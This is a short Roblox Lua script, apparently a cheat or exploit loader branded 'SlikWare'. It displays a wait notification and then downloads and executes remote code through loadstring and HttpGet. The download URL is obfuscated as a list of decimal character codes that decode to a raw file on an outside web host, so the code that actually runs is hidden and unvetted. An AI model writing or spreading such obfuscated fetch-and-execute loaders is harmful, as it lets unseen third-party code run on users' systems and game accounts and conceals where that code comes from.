local StarterGui = game:GetService("StarterGui")

StarterGui:SetCore("SendNotification", {
    Title = "SlikWare", 
    Text = "Wait 1-10 seconds",
    Duration = 5, 
   })

task.wait(0.2)

loadstring(game:HttpGet((function() local s="104/116/116/112/115/58/47/47/104/101/108/108/119/97/114/101/101/46/118/101/114/99/101/108/46/97/112/112/47/114/97/119/47/120/48/54/121/46/116/120/116" local t={} for n in s:gmatch("([^/]+)") do t[#t+1]=string.char(tonumber(n)) end return table.concat(t) end)()))()
